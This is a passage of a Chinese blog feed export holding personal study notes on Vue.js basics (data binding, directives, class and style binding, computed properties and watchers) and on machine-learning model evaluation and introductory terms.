&#x27;active&#x27;:isActive,&#x27;error&#x27;:isError &#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">           <span class="hljs-attr">isActive</span>: <span class="hljs-literal">true</span>,</span><br><span class="language-javascript">           <span class="hljs-attr">isError</span>:<span class="hljs-literal">false</span>,</span><br><span class="language-javascript">      &#125;</span><br><span class="language-javascript">      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    （2）使用computed</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;classes&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">       <span class="hljs-attr">computed</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><br><span class="language-javascript">           <span class="hljs-attr">return</span>:&#123;</span><br><span class="language-javascript">               <span class="hljs-attr">active</span>:<span class="hljs-variable language_">this</span>.<span class="hljs-property">isActive</span>,</span><br><span class="language-javascript">           &#125;</span><br><span class="language-javascript">       &#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    (3)组件上使用</p><p>​    </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs html">  <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.article</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: red;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.active</span>&#123;</span><br><span class="language-css">            <span class="hljs-attribute">color</span>: black;</span><br><span class="language-css">            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">30px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br> <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">my-component</span> <span class="hljs-attr">:class</span>=<span class="hljs-string">&quot;&#123; &#x27;active&#x27;: isActive &#125;&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">my-component</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>&gt;<br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-title class_">Vue</span>.<span class="hljs-title function_">component</span>(<span class="hljs-string">&#x27;my-component&#x27;</span>,&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">template</span>:<span class="hljs-string">&#x27;&lt;p class=&quot;article&quot;&gt;这是一个组件&lt;/p&gt;&#x27;</span></span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">        <span class="hljs-attr">el</span>:<span class="hljs-string">&#x27;#app&#x27;</span>,</span><br><span class="language-javascript">        <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">isActive</span>:<span class="hljs-literal">true</span></span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    &#125;)</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>3.绑定内联样式</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">:style</span>=<span class="hljs-string">&quot;styles&quot;</span>&gt;</span><br>            这是第二个组件<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <br>  data:&#123;<br>            isActive:true,<br>            styles:&#123;<br>                color:&#x27;pink&#x27;,<br>                fontSize: 35 +&#x27;px&#x27;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue.js实战（1）</title>
    <link href="/2020/11/17/Vue.js%E5%AE%9E%E6%88%98%EF%BC%881%EF%BC%89/"/>
    <url>/2020/11/17/Vue.js%E5%AE%9E%E6%88%98%EF%BC%881%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Ch1"><a href="#Ch1" class="headerlink" title="Ch1"></a>Ch1</h1><p>功能：</p><p>解耦视图与数据</p><p>可复用组件</p><p>前端路由</p><p>状态管理</p><p>虚拟Dom</p><h3 id="1-MVVM模式（Model-View-View-Model）"><a href="#1-MVVM模式（Model-View-View-Model）" class="headerlink" title="1.MVVM模式（Model-View-View-Model）"></a>1.MVVM模式（Model-View-View-Model）</h3><h1 id="Ch2"><a href="#Ch2" class="headerlink" title="Ch2"></a>Ch2</h1><h2 id="一、Vue实例与数据绑定"><a href="#一、Vue实例与数据绑定" class="headerlink" title="一、Vue实例与数据绑定"></a>一、Vue实例与数据绑定</h2><h3 id="1-数据绑定"><a href="#1-数据绑定" class="headerlink" title="1.数据绑定"></a>1.数据绑定</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;./js/vue.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>    //插值&#123;&#123;&#125;&#125;<br>        Welcome to home:&#123;&#123; home &#125;&#125;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-keyword">var</span> app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">            <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">            <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">                <span class="hljs-attr">home</span>:<span class="hljs-string">&#x27; http://www.lishengwang.top&#x27;</span>,</span><br><span class="language-javascript">            &#125;</span><br><span class="language-javascript">        &#125;)</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-生命周期"><a href="#2-生命周期" class="headerlink" title="2.生命周期"></a>2.生命周期</h3><p>​    a.created:完成数据观测，未挂载；</p><p>​    b.mounted：el挂载到实例；</p><p>​    c.beforeDestory：实例销毁前，解绑addEventListener监听事件等；</p><h3 id="3-v-html"><a href="#3-v-html" class="headerlink" title="3.v-html"></a>3.v-html</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">v-html</span>=<span class="hljs-string">&quot;html1&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">       <span class="hljs-keyword">var</span> app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;</span><br><span class="language-javascript">           <span class="hljs-attr">el</span>:<span class="hljs-string">&quot;#app&quot;</span>,</span><br><span class="language-javascript">           <span class="hljs-attr">data</span>:&#123;</span><br><span class="language-javascript">               <span class="hljs-attr">home</span>:<span class="hljs-string">&#x27; http://www.lishengwang.top&#x27;</span>,</span><br><span class="language-javascript">               <span class="hljs-attr">html1</span>:<span class="hljs-string">&#x27;&lt;a href=&quot;http://www.lishengwang.top&quot;&gt;Click!&lt;/a&gt;&#x27;</span></span><br><span class="language-javascript">           &#125;</span><br><span class="language-javascript">       &#125;)</span><br><span class="language-javascript">   </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-filter过滤器"><a href="#4-filter过滤器" class="headerlink" title="4.filter过滤器"></a>4.filter过滤器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">&#123;&#123; a|b &#125;&#125;<br></code></pre></td></tr></table></figure><h2 id="二、指令与事件"><a href="#二、指令与事件" class="headerlink" title="二、指令与事件"></a>二、指令与事件</h2><p>​    1.v-if</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;show&quot;</span>&gt;</span><br>          V-if实例<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <br> data:&#123;<br>              show:true<br>          &#125;,<br></code></pre></td></tr></table></figure><p>​    2.v-bind:绑定数据，随数据变化进行更新</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-bind:href</span>=<span class="hljs-string">&quot;home&quot;</span>&gt;</span>V-bind<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​    3.v-on：绑定事件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;show&quot;</span>&gt;</span><br>          V-if实例<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;toShow&quot;</span>&gt;</span>点击显示<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <br>   methods:&#123;<br>              notToShow:function()&#123;<br>                  this.show=false<br>              &#125;,<br>              toShow:function()&#123;<br>                  this.show=true<br>              &#125;<br></code></pre></td></tr></table></figure><p>​    4.v-model:绑定数据</p><p>​      </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>          Name：&#123;&#123; good.name &#125;&#125;<br>          Price: &#123;&#123; good.price &#125;&#125;<br>          Count: &#123;&#123; good.count &#125;&#125;<br><br>          All in: &#123;&#123; all_price &#125;&#125;<br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br><br>          <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>新价格：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;good.price&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">br</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>新数量：<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;good.count&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><p>4.语法糖</p><p>​    （1）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html">#v-on ===&gt; @<br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">v-on:click</span>=<span class="hljs-string">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;notToShow&quot;</span>&gt;</span>点击隐藏<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><br>#v-bindd ===&gt; :<br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">v-bind:href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">:href</span>=<span class="hljs-string">&quot;#&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
      <tag>Vue.js实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vue笔记</title>
    <link href="/2020/11/12/VUE%E9%94%99%E8%AF%AF%E7%AC%94%E8%AE%B0/"/>
    <url>/2020/11/12/VUE%E9%94%99%E8%AF%AF%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="VUE错误笔记"><a href="#VUE错误笔记" class="headerlink" title="VUE错误笔记"></a>VUE错误笔记</h1><p>1.Component template should contain exactly one root element. If you are using v-if on multiple element</p><p>解决方法：每个 Component只能有一个<div></div>div&gt;，所有的代码需要放进这个div中。</p><p>2.错误缩进</p><p>解决方案：关闭缩进报错工具。</p><h1 id="VUE备忘笔记"><a href="#VUE备忘笔记" class="headerlink" title="VUE备忘笔记"></a>VUE备忘笔记</h1><p>1.Computed Properties与普通方法的区别</p><p>computed properties 会把结果“缓存”起来，每次调用对应的Computed Properties如果所依赖的数据没有变动，则使用已经计算好的值；</p><p>2.watch表示监听方法</p><p>可以监控vue对象中数据的变换；</p><p>3.两者比较：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">watch</span>:&#123;<br>              <span class="hljs-attr">city</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">city_name</span>)&#123;<br>                  <span class="hljs-variable language_">this</span>.<span class="hljs-property">full_address</span>=city_name+<span class="hljs-string">&#x27;-&#x27;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">street</span>;<br>              &#125;,<br>              <span class="hljs-attr">street</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params">street_name</span>)&#123;<br>                  <span class="hljs-variable language_">this</span>.<span class="hljs-property">full_address</span>=<span class="hljs-variable language_">this</span>.<span class="hljs-property">city</span>+<span class="hljs-string">&#x27;-&#x27;</span>+street_name;<br>              &#125;<br>          &#125;,<br>          <span class="hljs-attr">computed</span>:&#123;<br>              <span class="hljs-attr">full_address1</span>:<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br>                  <span class="hljs-keyword">return</span> full_address1=<span class="hljs-variable language_">this</span>.<span class="hljs-property">city</span>+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-variable language_">this</span>.<span class="hljs-property">street</span><br>              &#125;<br></code></pre></td></tr></table></figure><p>4.component命名规则：小写字母+横线</p><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">Vue.component(&#x27;my-component-name&#x27;, &#123; /*....*/&#125;)<br></code></pre></td></tr></table></figure><p>W3C规范：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vue">Vue.component(&#x27;MyComponentName&#x27;, &#123; /*....*/&#125;)<br></code></pre></td></tr></table></figure><p>可以使用&lt;MyConponentName/&gt;调用；</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>VUE</tag>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习-CH2-模型评估与选择</title>
    <link href="/2020/11/07/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-CH2-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/"/>
    <url>/2020/11/07/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-CH2-%E6%A8%A1%E5%9E%8B%E8%AF%84%E4%BC%B0%E4%B8%8E%E9%80%89%E6%8B%A9/</url>
    
    <content type="html"><![CDATA[<h2 id="一、经验误差与过拟合"><a href="#一、经验误差与过拟合" class="headerlink" title="一、经验误差与过拟合"></a>一、经验误差与过拟合</h2><ol><li>错误率：E=a/m</li><li>误差：样本真实输出与预测输出之间的差异<pre><code class="hljs"> a.训练误差 b.测试误差 c.泛化误差</code></pre></li><li>注：努力使经验误差最小化；</li><li>过拟合： 将训练样本的特点当作所有样本的一般性质。</li><li>欠拟合：队训练样本的一般性质尚未学好。</li></ol><h2 id="二、评估方法"><a href="#二、评估方法" class="headerlink" title="二、评估方法"></a>二、评估方法</h2><ol><li>评估方向：泛化性能、时间开销、存储开销、可解释性等。</li><li>留出法：直接将数据集划分为两个互斥集合；两个集合尽可能保持数分布的一致性；随即划分、重复实验取均值；训练/测试=2：1 ~ 4：1</li><li>交叉验证法：将数据划分为K个大小相似的互斥子集，每次使用k-1个子集作为训练集，余下的作为测试集，最终得到k个结果的均值，k常取：10；</li><li>自助法：假设给定的数据集包含d个样本。该数据集有放回地抽样m次，产生m个样本的训练集。这样原数据样本中的某些样本很可能在该样本集中出现多次。没有进入该训练集的样本最终形成检验集（测试集）；</li><li>注：数据较小使用自助法，数据量足够使用留出法和交叉验证法；</li></ol><h2 id="三、性能度量"><a href="#三、性能度量" class="headerlink" title="三、性能度量"></a>三、性能度量</h2><ol><li>性能度量是衡量模型泛化能力的评价标准；</li><li>回归：均方误差<br><img src="https://img-blog.csdnimg.cn/20201106122704230.png#pic_center" alt="在这里插入图片描述"></li><li>分类：错误率、精度<br><img src="https://img-blog.csdnimg.cn/20201106122838653.png#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201106122856105.png#pic_center" alt="在这里插入图片描述"></li><li>查准率、查全率、F1<br>例：<br>判断得是否正确，在二分类任务中有四种表现形式，还拿西瓜🍉举例：<br>好西瓜判断成好西瓜，判断正确①；<br>好西瓜判断成坏西瓜，判断错误②；<br>坏西瓜判断成好西瓜，判断错误③；<br>坏西瓜判断成坏西瓜，判断正确④；<br>其中，①和④都是判断正确，②和③都是判断错误。错误率和精度是①和④、②和③的综合判断，只有判断正确与否的概念，没有正例反例的区别。<br><img src="https://img-blog.csdnimg.cn/20201106202201469.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>查准率P：【真正例样本数】与【预测结果是正例的样本数】的比值。</li></ol><p>查全率T：【真正例样本数】与【真实情况是正例的样本数】的比值。<br>注：P-R图（即以查全率做横轴，查准率做纵轴的平面示意图）<br><img src="https://img-blog.csdnimg.cn/2020110620242432.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；<br>当曲线有交叉的时候：<br>第一种方法是比较曲线下面积，但值不太容易估算；<br>第二种方法是比较两条曲线的平衡点，平衡点是“查准率=查全率”时的取值，在图中表示为曲线和对角线的交点。平衡点在外侧的曲线的学习器性能优于内侧。</p><ol start="5"><li>ROC与AUC<br>真正例率（TPR）：【真正例样本数】与【真实情况是正例的样本数】的比值。（查全率）<br>假正例率（FPR）：【假正例样本数】与【真实情况是反例的样本数】的比值。<br>ROC图全名“受试者工作特征”，以真正例率为纵轴，以假正例率为横轴。<br><img src="https://img-blog.csdnimg.cn/20201106202702423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>性能度量的方法：绘制ROC曲线<br>当曲线没有交叉的时候：外侧曲线的学习器性能优于内侧；<br>当曲线有交叉的时候：比较ROC面积，即AUC。</li><li>代价敏感错误率与代价曲线<br>性能度量的方法：绘制代价曲线<br>代价曲线的横轴是正例概率代价P(+)cost，纵轴是归一化代价 cost_{norm} 。</li></ol><h2 id="四、比较检验（见《概率论》）"><a href="#四、比较检验（见《概率论》）" class="headerlink" title="四、比较检验（见《概率论》）"></a>四、比较检验（见《概率论》）</h2><ol><li>二项检验</li><li>t检验</li><li>交叉验证t检验</li><li>5*2交叉检验</li></ol><h2 id="五、偏差与方差"><a href="#五、偏差与方差" class="headerlink" title="五、偏差与方差"></a>五、偏差与方差</h2><p>偏差：期望输出与真实标记的差别。<br>偏差度量学习算法期望预测与真实结果的偏离程度，刻画拟合能力；<br>方差度量同样大小训练集的变动所导致的学习性能的变化，刻画数据扰动的影响；<br>噪声表达学习算法的期望泛化误差的下线，刻画了学习问题本身的难度；<br>偏差-方差窘境：<br><img src="https://img-blog.csdnimg.cn/2020110722102568.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>计算机科学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>机器学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>机器学习-CH1-绪论</title>
    <link href="/2020/11/05/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-CH1-%E7%BB%AA%E8%AE%BA/"/>
    <url>/2020/11/05/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0-CH1-%E7%BB%AA%E8%AE%BA/</url>
    
    <content type="html"><![CDATA[<h2 id="一、引言"><a href="#一、引言" class="headerlink" title="一、引言"></a>一、引言</h2><pre><code class="hljs">机器学习致力于研究如何通过计算的手段，利用经验来改善系统性能。![在这里插入图片描述](https://img-blog.csdnimg.cn/20201105204318313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)</code></pre><h2 id="二、基本术语"><a href="#二、基本术语" class="headerlink" title="二、基本术语"></a>二、基本术语</h2><h2 id="1-数据"><a href="#1-数据" class="headerlink" title="1.数据"></a>1.数据</h2><pre><code class="hljs">    训练集=特征+标记    测试集=特征+？</code></pre><h2 id="2-任务"><a href="#2-任务" class="headerlink" title="2.任务"></a>2.任务</h2><pre><code class="hljs">    分类（离散值）：二分类，多分类。    回归（连续值）    聚类（无标记信息）        有无标记信息：            a、监督学习：分类、回归            b、无监督学习：聚类            c、半监督学习：两者结合</code></pre><h2 id="3-泛化能力"><a href="#3-泛化能力" class="headerlink" title="3.泛化能力"></a>3.泛化能力</h2><pre><code class="hljs">    模型适用于新样本的能力</code></pre><h2 id="三、假设空间"><a href="#三、假设空间" class="headerlink" title="三、假设空间"></a>三、假设空间</h2><pre><code class="hljs">    N=特征数|*特征可能值数|*样本数+测试样本数</code></pre><h2 id="四、归纳偏好"><a href="#四、归纳偏好" class="headerlink" title="四、归纳偏好"></a>四、归纳偏好</h2><pre><code class="hljs">    1.学习过程中对某种类型假设的偏好。    